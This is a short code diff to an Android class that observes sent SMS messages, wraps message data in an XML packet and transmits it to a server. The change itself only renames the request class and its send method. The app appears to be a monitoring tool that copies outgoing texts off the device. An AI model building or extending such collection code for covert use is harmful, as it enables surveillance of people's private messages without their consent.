@@ -14,7 +14,7 @@ import android.preference.PreferenceManager;
 import android.util.Log;
 
 import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
+import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.bs.WorkTimeDefiner;
 
 public class SmsSentObserver extends ContentObserver {
@@ -24,7 +24,7 @@ public class SmsSentObserver extends ContentObserver {
 	String dir = null;
 	SharedPreferences sp;
 	private Context mContext;
-	Request req;
+	RequestMakerImpl req;
 	private static long id = 0;
 
 	public SmsSentObserver(Handler handler, Context ctx) {
@@ -116,8 +116,8 @@ public class SmsSentObserver extends ContentObserver {
 										+ "</cdata1><ntime>" + "30"
 										+ "</ntime></packetSentObserver>";
 
-								req = new Request(mContext);
-								req.sendRequest(sendStr);
+								req = new RequestMakerImpl(mContext);
+								req.sendDataRequest(sendStr);
 
 								Log.d(TAG, sendStr);
 								FileLog.writeLog("smsSentObserver: " + sendStr);
